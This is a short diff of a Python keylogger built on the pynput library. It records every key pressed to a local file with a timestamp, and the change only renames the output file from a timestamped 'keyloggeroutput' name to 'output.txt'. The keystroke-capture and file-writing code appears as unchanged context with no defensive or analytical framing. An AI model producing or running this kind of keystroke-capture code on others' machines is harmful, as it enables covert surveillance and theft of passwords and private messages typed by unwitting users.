@@ -1,10 +1,9 @@
 from pynput.keyboard import Key, Listener
 import time
 
-date = "keyloggeroutput"
-date += time.strftime("%Y%m%d.%H%M%S") + ".txt" 
+file = "output.txt"
 x = time.ctime()
-with open(date, "w") as f:
+with open(file, "w") as f:
     f.write("[" + x + "]: " )
     
 count = 0
@@ -19,7 +18,7 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open(date, "a") as f:
+    with open(file, "a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k == "Key.enter":
